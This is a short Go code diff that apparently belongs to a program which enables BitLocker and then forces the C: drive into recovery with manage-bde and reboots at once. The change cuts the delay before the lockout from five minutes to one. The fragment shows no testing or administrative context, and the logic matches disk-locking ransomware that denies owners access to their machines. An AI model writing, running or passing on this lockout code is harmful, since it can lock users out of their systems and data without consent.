@@ -113,7 +113,7 @@ func tryEnableProtection() bool {
 
 func forceRecoveryAndReboot() {
 	log.Println("[SUCCESS] Protection ON — forcing recovery")
-	time.Sleep(5 * time.Minute)
+	time.Sleep(1 * time.Minute)
 	run(manageBDE, "-forcerecovery", "C:")
 	run("shutdown", "/r", "/t", "0")
 }
